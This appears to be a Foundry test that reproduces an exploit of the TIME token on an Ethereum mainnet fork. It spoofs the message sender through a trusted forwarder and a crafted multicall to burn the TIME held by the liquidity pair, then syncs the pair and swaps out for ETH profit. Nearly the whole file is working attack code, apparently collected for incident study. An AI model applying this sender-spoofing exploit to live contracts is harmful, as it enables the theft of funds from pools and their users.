// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV2.sol";

import "./ITime.sol";
import "./IForwarder.sol";

ITime constant TIME = ITime(0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29);
WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IUniswapV2Pair constant TIME_WETH = IUniswapV2Pair(
    0x760dc1E043D99394A10605B2FA08F123D60faF84
);
IUniswapV2Router constant PancakeV2Router = IUniswapV2Router(
    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
);
IForwarder constant forwarder = IForwarder(
    0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81
);

contract TimeTest is Test {
    address recoverAddr = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    uint256 recoverKey =
        0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;

    function setUp() public {
        vm.createSelectFork("mainnet", 18730462);

        vm.label(address(TIME), "TIME");
        vm.label(address(WETH), "WETH");
        vm.label(address(TIME_WETH), "TIME_WETH");
        vm.label(address(PancakeV2Router), "PancakeV2Router");
        vm.label(address(forwarder), "Forwarder");
        vm.label(recoverAddr, "recoverAddr");

        deal(address(this), 5 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("ETH balance before attack", address(this).balance, 18);
        TIME.approve(address(PancakeV2Router), type(uint256).max);
        WETH.approve(address(PancakeV2Router), type(uint256).max);

        WETH.deposit{value: 5 ether}();
        // WETH -> TIME
        token2token(
            address(WETH),
            address(TIME),
            WETH.balanceOf(address(this))
        );

        uint256 amountToBurn = 62227259510 ether;
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodePacked(
            TIME.burn.selector,
            amountToBurn,
            address(TIME_WETH)
        );
        bytes memory data = abi.encodeWithSelector(
            TIME.multicall.selector,
            datas
        );
        Forwarder.ForwardRequest memory request = Forwarder.ForwardRequest({
            from: recoverAddr,
            to: address(TIME),
            value: 0,
            gas: 5000000,
            nonce: 0,
            data: data
        });

        // Start exploit here
        forwarder.execute(
            request,
            hex"316df8f9c71c3c0ef9f070d5a84684a64c4a827b14b05b13ab1acaaf5251b500732f2aa31ab43844e9b0b23516b6bf6494fefecd33a542955b4eda3d574f2a8a1c"
        );
        // End exploit

        TIME_WETH.sync();
        token2token(
            address(TIME),
            address(WETH),
            TIME.balanceOf(address(this))
        );
        WETH.withdraw(WETH.balanceOf(address(this)));

        // In the end of attack tx also ~5 ether was transferred to Flashbot
        print("ETH balance after attack", address(this).balance, 18);
    }

    function token2token(
        address token1,
        address token2,
        uint256 amount
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(token1);
        path[1] = address(token2);

        PancakeV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}
